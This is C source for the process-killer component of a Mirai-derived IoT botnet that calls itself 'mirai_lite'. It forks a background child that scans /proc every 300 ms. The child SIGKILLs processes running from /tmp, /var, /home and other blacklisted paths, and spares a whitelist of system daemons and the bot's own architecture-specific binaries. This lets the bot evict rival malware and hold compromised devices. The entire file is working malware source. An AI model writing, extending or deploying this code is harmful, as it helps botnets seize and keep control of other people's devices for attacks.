#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/stat.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#ifdef __linux__
#include <sys/prctl.h>
#endif

#include "killer.h"

#define BUFFER 1024

int killer_pid = 0;
volatile int stop_flag_killer = 0; // Renamed to avoid collision if any

const char *whitelisted[] = {
    "/bin/busybox",
    "/usr/lib/systemd/systemd",
    "/usr/libexec/openssh/sftp-server",
    "usr/",
    "shell",
    "mnt/",
    "sys/",
    "bin/",
    "boot/",
    "run/",
    "media/",
    "srv/",
    "var/run/",
    "sbin/",
    "lib/",
    "etc/",
    "dev/",
    "telnet",
    "ssh",
    "watchdog",
    "sshd",
    "/usr/compress/bin/",
    "/compress/bin",
    "/compress/usr/",
    "bash",
    "main_x86",
    "main_x86_64",
    "main_mips",
    "main_mipsel",
    "main_arm",
    "main_arm5",
    "main_arm6",
    "main_arm7",
    "main_ppc",
    "main_m68k",
    "main_sh4",
    "main_spc",
    "httpd",
    "telnetd",
    "dropbear",
    "ropbear",
    "encoder",
    "system",
    "/root/dvr_gui/",
    "/root/dvr_app/",
    "/anko-app/",
    "/opt/",
    "mirai_lite" // Add ourselves just in case
};

const char *blacklisted[] = {
    "/tmp",
    "/var",
    "/mnt",
    "/boot",
    "/home",
    "/dev",
    "/.",
    "./",
    "/root",
    "(deleted)",
    NULL
};

static bool is_whitelisted(const char *path) {
    for (size_t i = 0; i < sizeof(whitelisted) / sizeof(whitelisted[0]); i++) {
        if (strstr(path, whitelisted[i]) != NULL) {
            return true;
        }
    }
    return false;
}

static void killer_exe(void) {
    DIR *dir;
    struct dirent *entry;

    // Get the PID of the current process
    pid_t current_pid = getpid();
    pid_t ppid = getppid();

    dir = opendir("/proc/");
    if (dir == NULL) {
        return;
    }

    while ((entry = readdir(dir))) {
        // Simple check if name is number
        if (!isdigit(entry->d_name[0])) continue;

        int pid = atoi(entry->d_name);
        
        // Skip self, parent, init
        if (pid <= 1 || pid == current_pid || pid == killer_pid || pid == ppid)
            continue;

        char proc_path[BUFFER];
        char link_path[BUFFER];

        snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
        ssize_t len = readlink(proc_path, link_path, sizeof(link_path) - 1);
        if (len == -1) {
            continue; 
        }

        link_path[len] = '\0';
        if (is_whitelisted(link_path))
            continue;

        for (int i = 0; blacklisted[i] != NULL; ++i) {
            if (strstr(link_path, blacklisted[i]) != NULL) {
                // printf("(condi/exe) Killed process: %s, PID: %d\n", link_path, pid);
                kill(pid, SIGKILL);
                break; // Break inner loop, next pid
            }
        }
    }

    closedir(dir);
}

static void killer_maps(void) {
    DIR *dir;
    struct dirent *file;
    char maps_path[BUFFER];
    char maps_line[BUFFER];

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    pid_t current_pid = getpid();
    pid_t ppid = getppid();

    while ((file = readdir(dir)) != NULL) {
        if (!isdigit(file->d_name[0])) continue;

        int pid = atoi(file->d_name);
        if (pid <= 1 || pid == current_pid || pid == killer_pid || pid == ppid)
            continue;

        snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

        FILE *maps_file = fopen(maps_path, "r"); // HOST FIX: maps_line -> maps_path
        if (maps_file == NULL)
            continue;

        while (fgets(maps_line, sizeof(maps_line), maps_file) != NULL) {
            // Check content of maps line
            // Usually format: address perms offset dev inode pathname
            
            // Check whitelist first
            if (is_whitelisted(maps_line))
                continue;

            int killed = 0;
            for (int i = 0; blacklisted[i] != NULL; ++i) {
                if (strstr(maps_line, blacklisted[i]) != NULL) {
                    // printf("(condi/maps) Killed Process: %s, PID: %d\n", maps_line, pid);
                    kill(pid, SIGKILL);
                    killed = 1;
                    break;
                }
            }
            if (killed) break; // Stop reading maps for this PID if dead
        }

        fclose(maps_file);
    }

    closedir(dir);
}

void killer_kill(void) {
    stop_flag_killer = 1; 
}

void killer_init(void) {
#ifdef __linux__
    int child = fork();
    if (child > 0 || child == -1) {
        // Parent or Error, return
        // If parent, we might want to store child PID to kill it later?
        // For now, simpler Condi logic: just return.
        // Also the user code had `if (child > 0 || child == 1)` likely checking init? 
        // Standard fork returns PID to parent.
        if (child > 0) killer_pid = child;
        return;
    }

    // Child Process
    // prctl to die if parent dies
    prctl(PR_SET_PDEATHSIG, SIGHUP); 
    
    // Loop forever
    while (!stop_flag_killer) {
        killer_exe();
        killer_maps();
        usleep(300000); // 300ms
    }
    exit(0);
#endif
}
